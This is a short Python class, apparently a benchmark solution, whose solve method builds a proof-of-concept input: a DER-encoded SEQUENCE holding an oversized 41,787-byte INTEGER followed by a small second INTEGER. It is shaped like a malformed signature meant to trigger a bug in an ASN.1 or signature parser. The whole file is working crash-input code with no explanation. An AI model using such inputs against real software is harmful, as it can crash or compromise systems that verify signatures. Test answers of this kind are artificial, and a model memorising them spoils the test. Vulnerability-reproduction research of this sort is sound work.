class Solution:
    def solve(self, src_path: str) -> bytes:
        N = 41787
        r_data = b'\x01' + b'\x00' * (N - 1)
        r_part = b'\x02\x82\xA3\x3B' + r_data
        s_part = b'\x02\x01\x01'
        content = r_part + s_part
        seq_len = b'\x82\xA3\x42'
        poc = b'\x30' + seq_len + content
        return poc